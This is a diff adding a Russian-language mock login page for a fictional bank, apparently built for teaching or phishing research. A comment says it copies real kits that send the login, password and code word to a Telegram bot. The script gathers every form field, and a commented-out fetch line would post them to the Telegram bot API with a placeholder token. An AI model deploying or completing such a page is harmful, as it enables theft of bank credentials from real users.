@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="ru">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Вход в интернет-банк</title><link rel="stylesheet" href="page.css">
+<style>:root{--c:#1d4ed8}</style></head>
+<body>
+<div class="site"><div class="logo">Б</div><b>Банк «Пример» – интернет-банк</b><span>учебная страница · все данные вымышлены</span></div>
+<main>
+<!-- Копия входа в онлайн-банк: логин, пароль и кодовое слово отправляются скриптом в Telegram-бота
+     (так устроены настоящие наборы «Tesco Bank» из архива Zenodo 14880589). Токен вымышлен, отправки нет. -->
+<form class="box" id="f" onsubmit="return false">
+  <h1>Вход в интернет-банк</h1>
+  <label for="u">Логин</label><input id="u" name="username">
+  <label for="p">Пароль</label><input id="p" name="password" type="password">
+  <label for="w">Кодовое слово</label><input id="w" name="codeword" placeholder="кодовое слово">
+  <button type="submit">Войти</button>
+</form>
+<script>
+const token = '0000000000:EDUCATIONAL-EXAMPLE', chat_id = '0';
+document.getElementById('f').addEventListener('submit', () => {
+  const text = [...document.querySelectorAll('input')].map((i) => i.name + ': ' + i.value).join('\n');
+  // fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=` + encodeURIComponent(text));
+});
+</script>
+</main>
+</body>
+</html>
